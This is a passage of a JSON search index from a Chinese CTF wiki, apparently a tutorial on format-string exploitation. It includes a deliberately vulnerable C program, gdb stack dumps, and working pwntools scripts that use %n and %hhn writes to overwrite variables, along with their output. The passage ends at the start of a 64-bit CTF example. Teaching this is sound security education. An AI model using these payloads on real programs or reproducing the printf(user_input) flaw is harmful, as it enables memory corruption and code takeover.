\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  x/x 0xffffcd10\n0xffffcd10:   0x6330785c", 
            "title": "\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_8", 
            "text": "\u4e0a\u9762\uff0c\u6211\u4eec\u5df2\u7ecf\u5c55\u793a\u4e86\u5982\u4f55\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u6cc4\u9732\u6808\u5185\u5b58\u4ee5\u53ca\u4efb\u610f\u5730\u5740\u5185\u5b58\uff0c\u90a3\u4e48\u6211\u4eec\u6709\u6ca1\u6709\u53ef\u80fd\u4fee\u6539\u6808\u4e0a\u53d8\u91cf\u7684\u503c\u5462\uff0c\u751a\u81f3\u4fee\u6539\u4efb\u610f\u5730\u5740\u53d8\u91cf\u7684\u5185\u5b58\u5462?\u7b54\u6848\u662f\u53ef\u884c\u7684\uff0c\u53ea\u8981\u53d8\u91cf\u5bf9\u5e94\u7684\u5730\u5740\u53ef\u5199\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u4fee\u6539\u5176\u5bf9\u5e94\u7684\u6570\u503c\u3002\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u60f3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u7c7b\u578b  %n,\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002  \u901a\u8fc7\u8fd9\u4e2a\u7c7b\u578b\u53c2\u6570\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u5c0f\u6280\u5de7\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\uff0c\u8fd9\u91cc\u4ecd\u7136\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4e3a\u8986\u76d6\u6808\u4e0a\u7684\u53d8\u91cf\uff0c\u7b2c\u4e8c\u90e8\u5206\u4e3a\u8986\u76d6\u6307\u5b9a\u5730\u5740\u7684\u53d8\u91cf\u3002  \u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\u3002  ##include  stdio.h  int   a   =   123 ,   b   =   456 ;  int   main ()   { \n   int   c   =   789 ; \n   char   s [ 100 ]; \n   printf ( %p \\n ,   c ); \n   scanf ( %s ,   s ); \n   printf ( s ); \n   if   ( c   ==   16 )   { \n     puts ( modified c. ); \n   }   else   if   ( a   ==   2 )   { \n     puts ( modified a for a small number. ); \n   }   else   if   ( b   ==   0x12345678 )   { \n     puts ( modified b for a big number! ); \n   } \n   return   0 ;  }   makefile\u5728\u5bf9\u5e94\u7684\u6587\u4ef6\u5939\u4e2d\u3002\u800c\u65e0\u8bba\u662f\u8986\u76d6\u54ea\u4e2a\u5730\u5740\u7684\u53d8\u91cf\uff0c\u6211\u4eec\u57fa\u672c\u4e0a\u90fd\u662f\u6784\u9020\u7c7b\u4f3c\u5982\u4e0b\u7684payload  ...[overwrite addr]....%[overwrite offset]$n  \u5176\u4e2d...\u8868\u793a\u6211\u4eec\u7684\u586b\u5145\u5185\u5bb9\uff0coverwrite addr \u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\uff0coverwrite offset\u5730\u5740\u8868\u793a\u6211\u4eec\u6240\u8981\u8986\u76d6\u7684\u5730\u5740\u5b58\u50a8\u7684\u4f4d\u7f6e\u4e3a\u8f93\u51fa\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570\u3002\u6240\u4ee5\u4e00\u822c\u6765\u8bf4\uff0c\u4e5f\u662f\u5982\u4e0b\u6b65\u9aa4   \u786e\u5b9a\u8986\u76d6\u5730\u5740  \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb  \u8fdb\u884c\u8986\u76d6", 
            "title": "\u8986\u76d6\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_9", 
            "text": "", 
            "title": "\u8986\u76d6\u6808\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_10", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u81ea\u7136\u662f\u6765\u60f3\u529e\u6cd5\u77e5\u9053\u6808\u53d8\u91cfc\u7684\u5730\u5740\u3002\u7531\u4e8e\u76ee\u524d\u51e0\u4e4e\u4e0a\u6240\u6709\u7684\u7a0b\u5e8f\u90fd\u5f00\u542f\u4e86aslr\u4fdd\u62a4\uff0c\u6240\u4ee5\u6808\u7684\u5730\u5740\u4e00\u76f4\u5728\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u6545\u610f\u8f93\u51fa\u4e86c\u53d8\u91cf\u7684\u5730\u5740\u3002", 
            "title": "\u786e\u5b9a\u8986\u76d6\u5730\u5740"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_11", 
            "text": "\u5176\u6b21\uff0c\u6211\u4eec\u6765\u786e\u5b9a\u4e00\u4e0b\u5b58\u50a8\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5730\u5740\u662fprintf\u5c06\u8981\u8f93\u51fa\u7684\u7b2c\u51e0\u4e2a\u53c2\u6570()\u3002 \u8fd9\u91cc\u6211\u4eec\u901a\u8fc7\u4e4b\u524d\u7684\u6cc4\u9732\u6808\u53d8\u91cf\u6570\u503c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u64cd\u4f5c\u3002\u901a\u8fc7\u8c03\u8bd5   \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffcd0c ,  l8 ]  8 \n0xffffcd0c\u2502+0x00: 0x080484d7  \u2192   main+76  add esp, 0x10     \u2190  $esp \n0xffffcd10\u2502+0x04: 0xffffcd28  \u2192   %d%d \n0xffffcd14\u2502+0x08: 0xffffcd8c  \u2192  0x00000315\n0xffffcd18\u2502+0x0c: 0x000000c2\n0xffffcd1c\u2502+0x10: 0xf7e8b6bb  \u2192   handle_intel+107  add esp, 0x10\n0xffffcd20\u2502+0x14: 0xffffcd4e  \u2192  0xffff0000  \u2192  0x00000000\n0xffffcd24\u2502+0x18: 0xffffce4c  \u2192  0xffffd07a  \u2192   XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...] \n0xffffcd28\u2502+0x1c:  %d%d      \u2190  $eax   \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u57280xffffcd28\u5904\u5b58\u50a8\u7740\u53d8\u91cfc\u7684\u6570\u503c\u3002\u7ee7\u800c\uff0c\u6211\u4eec\u518d\u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32'%d%d'\u7684\u5730\u57400xffffcd28\u76f8\u5bf9\u4e8eprintf\u51fd\u6570\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u65700xffffcd10\u7684\u504f\u79fb\u4e3a0x18\uff0c\u5373\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f8\u5f53\u4e8eprintf\u51fd\u6570\u7684\u7b2c7\u4e2a\u53c2\u6570\uff0c\u76f8\u5f53\u4e8e\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c6\u4e2a\u53c2\u6570\u3002", 
            "title": "\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_12", 
            "text": "\u8fd9\u6837\uff0c\u7b2c6\u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cfc\u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528%n\u7684\u7279\u5f81\u6765\u4fee\u6539c\u7684\u503c\u3002payload\u5982\u4e0b  [addr of c]%012d%6$n  addr of c \u7684\u957f\u5ea6\u4e3a4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u516512\u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u523016\u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539c\u7684\u503c\u4e3a16\u3002  \u5177\u4f53\u811a\u672c\u5982\u4e0b  def   forc (): \n     sh   =   process ( ./overwrite ) \n     c_addr   =   int ( sh . recvuntil ( \\n ,   drop = True ),   16 ) \n     print   hex ( c_addr ) \n     payload   =   p32 ( c_addr )   +   %012d   +   %6$n \n     print   payload \n     #gdb.attach(sh) \n     sh . sendline ( payload ) \n     print   sh . recv () \n     sh . interactive ()  forc ()   \u7ed3\u679c\u5982\u4e0b  \u279c  overwrite git: ( master )  \u2717 python exploit.py [ + ]  Starting  local  process  ./overwrite : pid  74806 \n0xfffd8cdc\n\u070c\ufffd\ufffd%012d%6 $n \n\u070c\ufffd\ufffd-00000160648modified c.", 
            "title": "\u8fdb\u884c\u8986\u76d6"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_13", 
            "text": "", 
            "title": "\u8986\u76d6\u4efb\u610f\u5730\u5740\u5185\u5b58"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_14", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u6765\u8003\u8651\u4e00\u4e0b\u5982\u4f55\u4fee\u6539data\u6bb5\u7684\u53d8\u91cf\u4e3a\u4e00\u4e2a\u8f83\u5c0f\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4\uff0c \u5c0f\u4e8e\u673a\u5668\u5b57\u957f\u7684\u6570\u5b57 \u3002\u8fd9\u91cc\u4ee52\u4e3a\u4f8b\u3002\u53ef\u80fd\u4f1a\u89c9\u5f97\u8fd9\u5176\u5b9e\u6ca1\u6709\u4ec0\u4e48\u533a\u522b\uff0c\u53ef\u4ed4\u7ec6\u4e00\u60f3\uff0c\u771f\u7684\u6ca1\u6709\u4e48\uff1f\u5982\u679c\u6211\u4eec\u8fd8\u662f\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u90a3\u4e48\u5c06\u76f4\u63a5\u5360\u7528\u673a\u5668\u5b57\u957f\u4e2a(4\u62168)\u5b57\u8282\u3002\u663e\u7136\uff0c\u65e0\u8bba\u4e4b\u540e\u5982\u4f55\u8f93\u51fa\uff0c\u90fd\u53ea\u4f1a\u6bd44\u5927\u3002   \u83b7\u53d6\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6574\u5f62\u6ea2\u51fa\u6765\u4fee\u6539\u5bf9\u5e94\u7684\u5730\u5740\u7684\u503c\uff0c\u4f46\u662f\u8fd9\u6837\u5c06\u9762\u4e34\u7740\u6211\u4eec\u5f97\u4e00\u6b21\u8f93\u51fa\u5927\u91cf\u7684\u5185\u5bb9\u3002\u800c\u8fd9\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u57fa\u672c\u90fd\u4e0d\u4f1a\u653b\u51fb\u6210\u529f\u3002   \u90a3\u4e48\u6211\u4eec\u5e94\u8be5\u600e\u4e48\u505a\u5462\uff1f\u518d\u4ed4\u7ec6\u60f3\u4e00\u4e0b\uff0c\u6211\u4eec\u6709\u5fc5\u8981\u5c06\u6240\u8981\u8986\u76d6\u7684\u53d8\u91cf\u7684\u5730\u5740\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\u4e48\uff1f\u4f3c\u4e4e\u6ca1\u6709\uff0c\u6211\u4eec\u5f53\u65f6\u53ea\u662f\u4e3a\u4e86\u5bfb\u627e\u504f\u79fb\uff0c\u6240\u4ee5\u624d\u628atag\u653e\u5728\u5b57\u7b26\u4e32\u7684\u6700\u524d\u9762\uff0c\u5982\u679c\u6211\u4eec\u628atag\u653e\u5728\u4e2d\u95f4\uff0c\u5176\u5b9e\u4e5f\u662f\u65e0\u59a8\u7684\u3002\u7c7b\u4f3c\u7684\uff0c\u6211\u4eec\u628a\u5730\u5740\u653e\u5728\u4e2d\u95f4\uff0c\u53ea\u8981\u80fd\u591f\u627e\u5230\u5bf9\u5e94\u7684\u504f\u79fb\uff0c\u5176\u7167\u6837\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u6570\u503c\u3002\u524d\u9762\u5df2\u7ecf\u8bf4\u4e86\u6211\u4eec\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4e3a\u7b2c6\u4e2a\u53c2\u6570\u3002\u7531\u4e8e\u6211\u4eec\u60f3\u8981\u628a2\u5199\u5230\u5bf9\u5e94\u7684\u5730\u5740\u5904\uff0c\u6545\u800c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u524d\u9762\u7684\u5b57\u8282\u5fc5\u987b\u662f  aa%k$n  \u6b64\u65f6\u5bf9\u5e94\u7684\u5b58\u50a8\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5df2\u7ecf\u5360\u636e\u4e866\u4e2a\u5b57\u7b26\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u6211\u4eec\u518d\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26aa\uff0c\u90a3\u4e48\u5176\u5b9eaa%k\u5c31\u662f\u7b2c6\u4e2a\u53c2\u6570\uff0c$naa\u5176\u5b9e\u5c31\u662f\u7b2c7\u4e2a\u53c2\u6570\uff0c\u540e\u9762\u6211\u4eec\u5982\u679c\u8ddf\u4e0a\u6211\u4eec\u8981\u8986\u76d6\u7684\u5730\u5740\uff0c\u90a3\u5c31\u662f\u7b2c8\u4e2a\u53c2\u6570\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u8fd9\u91cc\u8bbe\u7f6ek\u4e3a8\uff0c\u5176\u5b9e\u5c31\u53ef\u4ee5\u8986\u76d6\u4e86\u3002  \u5229\u7528ida\u53ef\u4ee5\u5f97\u5230a\u7684\u5730\u5740\u4e3a0x0804A024  .data: 0804 A024                   public   a  .data: 0804 A024   a                 dd   7 Bh     \u6545\u800c\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u5982\u4e0b\u7684\u5229\u7528\u4ee3\u7801  def   fora (): \n     sh   =   process ( ./overwrite ) \n     a_addr   =   0x0804A024 \n     payload   =   aa%8$naa   +   p32 ( a_addr ) \n     sh . sendline ( payload ) \n     print   sh . recv () \n     sh . interactive ()   \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b  \u279c  overwrite git: ( master )  \u2717 python exploit.py [ + ]  Starting  local  process  ./overwrite : pid  76508  [ * ]  Process  ./overwrite  stopped with  exit  code  0   ( pid  76508 ) \n0xffc1729c\naaaa$ \\x a0 \\x 0modified a  for  a small number.  \u5176\u5b9e\uff0c\u8fd9\u91cc\u6211\u4eec\u9700\u8981\u638c\u63e1\u7684\u5c0f\u6280\u5de7\u5c31\u662f\uff0c\u6211\u4eec\u6ca1\u6709\u5fc5\u8981\u5fc5\u987b\u628a\u5730\u5740\u653e\u5728\u6700\u524d\u9762\uff0c\u653e\u5728\u90a3\u91cc\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u6211\u4eec\u53ef\u4ee5\u627e\u5230\u5176\u5bf9\u5e94\u7684\u504f\u79fb\u5373\u53ef\u3002", 
            "title": "\u8986\u76d6\u5c0f\u6570\u5b57"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_exploit/#_15", 
            "text": "\u4e0a\u9762\u4ecb\u7ecd\u4e86\u8986\u76d6\u5c0f\u6570\u5b57\uff0c\u8fd9\u91cc\u6211\u4eec\u5c31\u5c11\u8986\u76d6\u5927\u6570\u5b57\u4e86\u3002\u4e0a\u9762\u6211\u4eec\u4e5f\u8bf4\u4e86\uff0c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u4e00\u6b21\u6027\u8f93\u51fa\u5927\u6570\u5b57\u4e2a\u5b57\u8282\u6765\u8fdb\u884c\u8986\u76d6\uff0c\u4f46\u662f\u8fd9\u6837\u57fa\u672c\u4e5f\u4e0d\u4f1a\u6210\u529f\uff0c\u56e0\u4e3a\u592a\u957f\u4e86\u3002\u800c\u4e14\u5373\u4f7f\u6210\u529f\uff0c\u6211\u4eec\u4e00\u6b21\u6027\u7b49\u5f85\u7684\u65f6\u95f4\u4e5f\u592a\u957f\u4e86\uff0c\u90a3\u4e48\u6709\u6ca1\u6709\u4ec0\u4e48\u6bd4\u8f83\u597d\u7684\u65b9\u5f0f\u5462\uff1f\u81ea\u7136\u662f\u6709\u4e86\u3002  \u4e0d\u8fc7\u5728\u4ecb\u7ecd\u4e4b\u524d\uff0c\u6211\u4eec\u5f97\u5148\u518d\u7b80\u5355\u4e86\u89e3\u4e00\u4e0b\uff0c\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u7684\u5b58\u50a8\u683c\u5f0f\u3002\u9996\u5148\uff0c\u6240\u6709\u7684\u53d8\u91cf\u5728\u5185\u5b58\u4e2d\u90fd\u662f\u4ee5\u5b57\u8282\u8fdb\u884c\u5b58\u50a8\u7684\u3002\u6b64\u5916\uff0c\u53d8\u91cf\u4e00\u822c\u7684\u5b58\u50a8\u683c\u5f0f\u4e3a\u4ee5\u5c0f\u7aef\u5b58\u50a8\uff0c\u5373\u6700\u4f4e\u6709\u6548\u4f4d\u5b58\u50a8\u5728\u4f4e\u5730\u5740\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff0c0x12345678\u5728\u5185\u5b58\u4e2d\u7531\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u4e3a\\x78\\x56\\x34\\x12\u3002\u518d\u8005\uff0c\u6211\u4eec\u53ef\u4ee5\u56de\u5fc6\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u91cc\u9762\u7684\u6807\u5fd7\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u8fd9\u4e48\u4e24\u4e2a\u6807\u5fd7  hh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4ecechar\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002\nh  \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0cprintf\u671f\u5f85\u4e00\u4e2a\u4eceshort\u63d0\u5347\u7684int\u5c3a\u5bf8\u7684\u6574\u578b\u53c2\u6570\u3002  \u6240\u4ee5\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528%hhn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u5355\u5b57\u8282\uff0c\u5229\u7528%hn\u5411\u67d0\u4e2a\u5730\u5740\u5199\u5165\u53cc\u5b57\u8282\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee5\u5355\u5b57\u8282\u4e3a\u4f8b\u3002  \u9996\u5148\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u786e\u5b9a\u7684\u662f\u8981\u8986\u76d6\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u5229\u7528ida\u770b\u4e00\u4e0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u5730\u5740\u4e3a0x0804A028\u3002  .data:0804A028                 public b\n.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510\u0018r  \u5373\u6211\u4eec\u5e0c\u671b\u5c06\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u8fdb\u884c\u8986\u76d6\uff0c\u524d\u9762\u4e3a\u8986\u76d6\u5730\u5740\uff0c\u540e\u9762\u4e3a\u8986\u76d6\u5185\u5bb9\u3002  0x0804A028 \\x78\n0x0804A029 \\x56\n0x0804A02a \\x34\n0x0804A02b \\x12  \u9996\u5148\uff0c\u7531\u4e8e\u6211\u4eec\u7684\u5b57\u7b26\u4e32\u7684\u504f\u79fb\u4e3a6\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u6211\u4eec\u7684payload\u57fa\u672c\u662f\u8fd9\u4e2a\u6837\u5b50\u7684  p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+ %6$n +pad2+ %7$n +pad3+ %8$n +pad4+ %9$n   \u6211\u4eec\u53ef\u4ee5\u4f9d\u6b21\u8fdb\u884c\u8ba1\u7b97\u3002\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u57fa\u672c\u7684\u6784\u9020\uff0c\u5982\u4e0b  def   fmt ( prev ,   word ,   index ): \n     if   prev     word : \n         result   =   word   -   prev \n         fmtstr   =   %   +   str ( result )   +   c \n     elif   prev   ==   word : \n         result   =   0 \n     else : \n         result   =   256   +   word   -   prev \n         fmtstr   =   %   +   str ( result )   +   c \n     fmtstr   +=   %   +   str ( index )   +   $hhn \n     return   fmtstr  def   fmt_str ( offset ,   size ,   addr ,   target ): \n     payload   =   \n     for   i   in   range ( 4 ): \n         if   size   ==   4 : \n             payload   +=   p32 ( addr   +   i ) \n         else : \n             payload   +=   p64 ( addr   +   i ) \n     prev   =   len ( payload ) \n     for   i   in   range ( 4 ): \n         payload   +=   fmt ( prev ,   ( target     i   *   8 )     0xff ,   offset   +   i ) \n         prev   =   ( target     i   *   8 )     0xff \n     return   payload  payload   =   fmt_str ( 6 , 4 , 0x0804A028 , 0x12345678 )   \u5176\u4e2d\u6bcf\u4e2a\u53c2\u6570\u7684\u542b\u4e49\u57fa\u672c\u5982\u4e0b   offset\u8868\u793a\u8981\u8986\u76d6\u7684\u5730\u5740\u6700\u521d\u7684\u504f\u79fb  size\u8868\u793a\u673a\u5668\u5b57\u957f  addr\u8868\u793a\u5c06\u8981\u8986\u76d6\u7684\u5730\u5740\u3002  target\u8868\u793a\u6211\u4eec\u8981\u8986\u76d6\u4e3a\u7684\u76ee\u7684\u53d8\u91cf\u503c\u3002   \u76f8\u5e94\u7684exploit\u5982\u4e0b  def   forb (): \n     sh   =   process ( ./overwrite ) \n     payload   =   fmt_str ( 6 ,   4 ,   0x0804A028 ,   0x12345678 ) \n     print   payload \n     sh . sendline ( payload ) \n     print   sh . recv () \n     sh . interactive ()   \u7ed3\u679c\u5982\u4e0b  \u279c    overwrite   git :( master )   \u2717   python   exploit . py  [ + ]   Starting   local   process   ./overwrite :   pid   78547  ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0 % 104 c % 6 $ hhn % 222 c % 7 $ hhn % 222 c % 8 $ hhn % 222 c % 9 $ hhn  [ * ]   Process   ./overwrite   stopped   with   exit   code   0   ( pid   78547 )  0xfff6f9bc  ( \\ xa0 \\ x0 ) \\ xa0 \\ x0 * \\ xa0 \\ x0 + \\ xa0 \\ x0                                                                                                         X                                                                                                                                                                                                                               \ufffd                                                                                                                                                                                                                              \\ xbb                                                                                                                                                                                                                               ~ modified   b   for   a   big   number !   \u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528%n\u5206\u522b\u5bf9\u6bcf\u4e2a\u5730\u5740\u8fdb\u884c\u5199\u5165\uff0c\u4e5f\u53ef\u4ee5\u5f97\u5230\u5bf9\u5e94\u7684\u7b54\u6848\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u4eec\u5199\u5165\u7684\u53d8\u91cf\u90fd\u53ea\u4f1a\u5f71\u54cd\u7531\u5176\u5f00\u59cb\u7684\u56db\u4e2a\u5b57\u8282\uff0c\u6240\u4ee5\u6700\u540e\u4e00\u4e2a\u53d8\u91cf\u5199\u5b8c\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u4fee\u6539\u4e4b\u540e\u7684\u4e09\u4e2a\u5b57\u8282\uff0c\u5982\u679c\u8fd9\u4e09\u4e2a\u5b57\u8282\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\uff0c\u7a0b\u5e8f\u5c31\u6709\u53ef\u80fd\u56e0\u6b64\u5d29\u6e83\u3002\u800c\u91c7\u7528%hhn\u5219\u4e0d\u4f1a\u6709\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u8fd9\u6837\u53ea\u4f1a\u4fee\u6539\u76f8\u5e94\u5730\u5740\u7684\u4e00\u4e2a\u5b57\u8282\u3002", 
            "title": "\u8986\u76d6\u5927\u6570\u5b57"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4f8b\u5b50\n\n\n\u4e0b\u9762\u4f1a\u4ecb\u7ecd\u4e00\u4e9bCTF\u4e2d\u7684\u683c\u5f0f\u5316\u6f0f\u6d1e\u7684\u9898\u76ee\u3002\u4e5f\u90fd\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5e38\u89c1\u7684\u5229\u7528\u3002\n\n\n64\u4f4d\u7a0b\u5e8f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\n\n\n\u539f\u7406\n\n\n\u5176\u5b9e64\u4f4d\u7684\u504f\u79fb\u8ba1\u7b97\u548c32\u4f4d\u7c7b\u4f3c\uff0c\u90fd\u662f\u7b97\u5bf9\u5e94\u7684\u53c2\u6570\u3002\u53ea\u4e0d\u8fc764\u4f4d\u51fd\u6570\u7684\u524d6\u4e2a\u53c2\u6570\u662f\u5b58\u50a8\u5728\u76f8\u5e94\u7684\u5bc4\u5b58\u5668\u4e2d\u7684\u3002\u90a3\u4e48\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u4e2d\u5462\uff1f\u867d\u7136\u6211\u4eec\u5e76\u6ca1\u6709\u5411\u76f8\u5e94\u5bc4\u5b58\u5668\u4e2d\u653e\u5165\u6570\u636e\uff0c\u4f46\u662f\u7a0b\u5e8f\u4f9d\u65e7\u4f1a\u6309\u7167\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u76f8\u5e94\u683c\u5f0f\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\uff0c\u6211\u4eec\u4ee52017\u5e74\u7684UIUCTF\u4e2dpwn200 GoodLuck\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002\u8fd9\u91cc\u7531\u4e8e\u53ea\u6709\u672c\u5730\u73af\u5883\uff0c\u6240\u4ee5\u6211\u5728\u672c\u5730\u8bbe\u7f6e\u4e86\u4e00\u4e2aflag.txt\u6587\u4ef6\u3002\n\n\n\u786e\u5b9a\u4fdd\u62a4\n\n\n\u279c  \n2017\n-UIUCTF-pwn200-GoodLuck git:\n(\nmaster\n)\n \u2717 checksec goodluck\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE 